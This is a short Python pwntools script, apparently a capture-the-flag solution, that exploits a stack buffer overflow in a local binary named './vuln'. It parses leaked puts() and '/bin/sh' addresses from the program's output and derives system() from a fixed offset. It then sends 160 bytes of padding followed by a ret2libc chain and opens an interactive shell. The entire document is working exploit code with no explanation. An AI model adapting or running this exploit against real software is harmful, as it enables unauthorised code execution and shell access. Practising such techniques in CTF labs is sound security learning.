#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

#context.log_level = 'critical'

p = ELF("./vuln").process()

response = p.recvuntil("Enter a string:\n")

puts = int(response.split(': ')[1].split('\n')[0], 16) 			# offset
system = p32(puts - 0x2af70)									# offset - 0x2af70 = system()
exit = "A" * 4													# ret
bin_sh = p32(int(response.split(': ')[4].split('\n')[0], 16))

exploit = ""
exploit = "A" * 160 											# junk
exploit += system												# system() addr
exploit += exit													# exit addr (doesnt matter)
exploit += bin_sh												# '/bin/sh'

p.sendline(exploit)
p.interactive()
p.close()